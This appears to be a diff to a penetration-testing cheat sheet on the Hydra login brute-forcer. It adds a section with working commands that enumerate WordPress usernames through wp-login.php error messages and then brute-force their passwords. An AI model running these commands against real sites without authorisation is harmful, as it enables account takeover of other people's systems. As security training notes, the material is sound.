@@ -4,6 +4,10 @@
 hydra -l <username> -P <password_list_path> <service>://<IP_or_domain_name> 
 ```
 
+
+---
+
+
 ## Using hydra in a web login page
 It can be useful intercept the petition with burp for extract the different fields. 
 
@@ -23,3 +27,16 @@ It can be useful intercept the petition with burp for extract the different fiel
 ```bash
 hydra -t 64 -l <username> -P <password_list> -f http-post-form "http://<target-ip-or-url>/<path_to_login_form>:<username_field>=^USER^&<password_field>=^PASS^:<error_message>"
 ```
+
+
+#### Using hydra in a Wordpress login page
+First enumerate users:
+```bash
+hydra -L /path/to/wordlist.txt -p fakepass target-site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
+```
+Then use the extracted user to do a brute-force attack to obtain the password.
+
+```bash
+hydra -L <extracted_user> -P /path/to/wordlist.txt target-site.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username <user> is incorrect."
+```
+Maybe you need to change the error message value.
